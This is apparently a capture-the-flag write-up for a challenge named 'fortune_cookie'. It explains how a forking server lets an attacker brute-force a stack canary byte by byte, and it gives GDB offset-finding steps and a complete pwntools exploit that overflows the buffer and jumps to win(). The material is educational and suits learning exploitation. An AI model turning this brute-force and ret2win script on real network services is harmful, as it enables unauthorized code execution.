## Fortune Cookie - ret2win with Canary Brute-Forced

This challenge follows the same structural goal as a standard ret2win, meaning the objective is to redirect execution to the hidden `win()` function, but the presence of a stack canary and a `fork()`-based server architecture introduces a layer that must be addressed before the final payload can be delivered.


### Phase 0 - Challenge Triage

The binary sub-category is a stack buffer overflow with a canary bypass requirement, specifically a brute-force oracle attack enabled by the server's use of `fork()`. The artifacts provided are the `fortune_cookie` ELF binary and its C source `main.c`. The initial hypothesis is: this challenge looks like a ret2win with canary brute-force because the server forks on each connection, meaning all child processes share the same canary value, which makes byte-by-byte guessing feasible.


### Phase 1 - Reconnaissance & Enumeration

Run `checksec` to confirm which protections are active:

```bash
checksec --file ./fortune_cookie
```

Then open `main.c` and identify where the buffer is declared and how large it is, where the program reads input and whether a length check is missing, and what reply the server sends when the child survives, since that string is the oracle message you will pattern-match against in the brute-force loop.

Start the server locally in one terminal and test it from another before touching the exploit:

```bash
./fortune_cookie
nc 127.0.0.1 4444
```

Send a normal message and confirm you receive a reply.


### Phase 2 - Vulnerability Identification

The vulnerability is a classic stack buffer overflow with no bounds check on the input. The canary is present but exploitable via a fork-based oracle, and NX is enabled so no shellcode is possible, meaning the final step must be a ROP-style redirect to `win()`. PIE is off, so all binary addresses are static.

#### Why fork() Is the Attacker's Best Friend

When a server calls `fork()` to handle each incoming connection, the child process is an exact memory copy of the parent, including the stack, the heap, and critically the canary. This has a fundamental implication: every child process shares the same canary value for the entire lifetime of the parent, which transforms what would normally be an impossible blind guess into a reliable byte-by-byte oracle attack.

The oracle works as follows: if you send a payload containing a wrong canary byte, the child crashes and the connection closes without a reply; if you send the correct byte, the child survives and responds with the oracle message (in this case `"OK"`). Since the canary is eight bytes long but the first byte is always `\x00` by design (a null terminator intended to stop string leaks), only seven bytes actually need to be brute-forced, giving a worst-case total of 1792 attempts, which is entirely practical.

|Bytes to guess|Attempts per byte (worst case)|Total worst case|
|---|---|---|
|7|256|**1792 attempts**|

#### Why This Does Not Work With exec()

When a server uses `exec()` instead of `fork()`, the operating system re-randomizes the canary for every new process, so there is no shared memory state to exploit and every connection faces a completely fresh, unknown canary value. The oracle attack described here is only viable because `fork()` preserves the parent's memory image in full.

### Phase 3 - Exploitation Plan

```
TARGET VULNERABILITY: Stack buffer overflow with canary
GOAL: Redirect execution to win() and get a shell
APPROACH:
  Step 1: Brute-force the 7 unknown canary bytes byte-by-byte using the fork() oracle
  Step 2: Reconstruct the full 8-byte canary (prepending the known \x00 byte)
  Step 3: Build the final payload: buffer fill + canary + saved RBP filler + ret gadget + win()
TOOLS: pwntools, GDB + pwndbg, ROPgadget, nm
RISK OF FAILURE: network timeout too short for slow connections; stack misalignment if ret gadget is omitted
```


### Phase 4 - Exploit Development

#### Finding the Offset to the Canary

Open GDB and use `cyclic` to measure the exact distance from the start of the buffer to the canary slot:

```
gdb ./fortune_cookie
pwndbg> cyclic 200
pwndbg> run
```

The canary always lives at `$rbp - 0x8`, so print that address:

```bash
pwndbg> print $rbp - 0x8
$1 = (void *) 0x7fffffffe238
```

Then read the value stored there to recover the cyclic pattern that landed at the canary slot:

```bash
pwndbg> print *0x7fffffffe238
$2 = 1633771891
```

Then ask `cyclic` for the offset of that value:

```bash
pwndbg> cyclic -l 1633771891
Found at offset 72
```

So the constant is:

```python
OFFSET_TO_CANARY = 72
```

#### Finding the Offset to RIP

This follows directly from the stack layout, where above the canary sits the saved RBP (8 bytes) and then the return address, giving the formula:

```
OFFSET_TO_RIP = OFFSET_TO_CANARY (72) + 8 bytes (canary) + 8 bytes (saved RBP) = 88
```

```python
OFFSET_TO_RIP = 88
```

#### Recovering the Address of win()

Since PIE is off, the address is static and can be read directly from the symbol table:

```bash
nm ./fortune_cookie | grep win
```

#### Finding the ret Gadget for Stack Alignment

This is only needed when `win()` or a function it calls contains a `movaps` instruction, which requires 16-byte stack alignment. Check with:

```bash
ROPgadget --binary ./fortune_cookie | grep ": ret$"
```

#### Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF('./fortune_cookie')
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_CANARY = 72
OFFSET_TO_RIP    = 88   # canary + saved RBP

# ── gadgets ───────────────────────────────────────────────────────────────────
GADGET = 0x0000000000401530   # ret — stack alignment

def conn(interactive=False):
    level = 'info' if interactive else 'error'
    if args.LOCAL:
        return remote('127.0.0.1', 4444, level=level)
    return remote(HOSTNAME, PORT, level=level)

def main():
    # ── leak phase (canary brute-force) ───────────────────────────────────────
    known = b"\x00"

    for i in range(7):
        for bval in range(256):
            guess = known + bytes([bval])
            payload = b"A" * OFFSET_TO_CANARY + guess
            r = conn()
            r.recvuntil(b"wish\n")
            r.send(payload)
            try:
                data = r.recv(timeout=0.2)
            except EOFError:
                data = b""
            r.close()
            if b"OK" in data:
                known = guess
                log.success(f"byte {i+1}: {bval:#04x}")
                break

    canary = u64(known)
    log.info(f"canary = {canary:#x}")

    # ── exploit phase ─────────────────────────────────────────────────────────
    r = conn(interactive=True)
    r.recvuntil(b"wish\n")
    payload = flat(
        b"A" * OFFSET_TO_CANARY,
        p64(canary),
        b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),   # overwrite saved RBP
        p64(GADGET),
        p64(exe.sym.win),
    )
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    main()
```